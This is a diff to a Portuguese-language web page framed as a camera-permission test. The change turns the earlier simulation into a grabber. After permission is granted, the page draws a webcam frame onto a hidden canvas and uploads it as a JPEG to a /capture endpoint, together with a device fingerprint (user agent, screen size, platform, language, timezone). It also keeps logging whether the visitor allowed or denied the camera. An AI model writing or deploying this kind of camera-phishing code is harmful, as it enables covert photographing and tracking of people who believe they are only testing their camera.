@@ -84,11 +84,13 @@ button {
     <p class="status" id="status">Aguardando seleção...</p>
 
     <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
 const statusText = document.getElementById("status");
 const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
 async function registrarEvento(tipo, acao, status, extra = {}) {
     const resposta = await fetch("/evento", {
@@ -124,15 +126,47 @@ async function testarCamera() {
         video.srcObject = stream;
         video.style.display = "block";
 
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
         await registrarEvento("camera", "permissao_camera", "permitida");
 
-        statusText.textContent = "Permissão de câmera concedida ✅";
+        statusText.textContent = "Permissão concedida ✅ Capturando imagem...";
 
-        setTimeout(() => {
+        setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const image = canvas.toDataURL("image/jpeg", 0.8);
+
+            const respostaFoto = await fetch("/capture", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    image: image,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screen: screen.width + "x" + screen.height,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                })
+            });
+
             stream.getTracks().forEach(track => track.stop());
             video.style.display = "none";
-            statusText.textContent = "Simulação de câmera concluída ✅";
-        }, 2000);
+
+            statusText.textContent = respostaFoto.ok
+                ? "Foto salva com sucesso ✅"
+                : "Erro ao salvar foto ❌";
+
+        }, 1200);
 
     } catch (err) {
         await registrarEvento("camera", "permissao_camera", "negada");
